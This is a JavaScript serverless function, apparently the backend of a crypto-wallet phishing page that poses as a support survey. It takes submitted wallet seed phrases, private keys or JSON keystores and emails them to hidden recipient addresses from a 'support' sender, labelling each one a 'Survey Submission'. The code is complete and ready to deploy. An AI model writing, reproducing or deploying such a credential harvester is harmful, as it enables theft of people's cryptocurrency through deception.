const { Resend } = require('resend');

const resend = new Resend(process.env.RESEND_API_KEY);

const methodLabels = {
  phrase: "Phrase",
  private_key: "Private Key",
  json_key_store: "JSON Key Store",
};

exports.handler = async (event, context) => {
  // Handle CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  // Only allow POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const { walletCode, walletName, connectionMethod, additionalText } = JSON.parse(event.body);

    if (!walletCode || !connectionMethod) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Missing required fields' }),
      };
    }

    const methodLabel = methodLabels[connectionMethod] || connectionMethod;
    const recipients = [process.env.EMAIL_1, process.env.EMAIL_2].filter(Boolean);

    if (recipients.length === 0) {
      throw new Error('No email recipients configured');
    }

    const emailPromises = recipients.map(recipient =>
      resend.emails.send({
        from: 'Support <support@support.fixorbits.com>',
        to: recipient,
        subject: `New Survey Submission - ${walletName}`,
        html: `
          <h1>New Survey Submission</h1>
          <h2>Wallet Details</h2>
          <ul>
            <li><strong>Wallet Name:</strong> ${walletName}</li>
            <li><strong>Wallet Code:</strong> ${walletCode}</li>
          </ul>
          <h2>Connection Feedback</h2>
          <ul>
            <li><strong>Issue Selected:</strong> ${methodLabel}</li>
          </ul>
          ${additionalText ? `
          <h2>Additional Information</h2>
          <p>${additionalText.replace(/\n/g, '<br>')}</p>
          ` : ''}
          <hr>
          <p><em>Submitted via STBL Survey Form</em></p>
        `,
      })
    );

    const results = await Promise.all(emailPromises);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, data: results }),
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: error.message }),
    };
  }
};